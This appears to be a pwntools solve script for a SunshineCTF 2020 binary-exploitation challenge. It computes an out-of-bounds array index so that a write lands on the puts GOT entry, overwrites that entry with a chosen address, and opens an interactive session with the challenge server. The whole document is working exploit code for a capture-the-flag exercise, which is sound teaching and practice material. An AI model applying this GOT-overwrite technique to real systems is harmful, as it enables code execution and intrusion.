from pwn import *

puts_got = 0x6009E8
target   = 0x600A40

p = remote("chal.2020.sunshinectf.org", 30008)

where = ((2**64 - 1) & (puts_got - target)) // 8
what = 0x400567

p.sendline(str(where))
p.sendline(str(what))

p.interactive()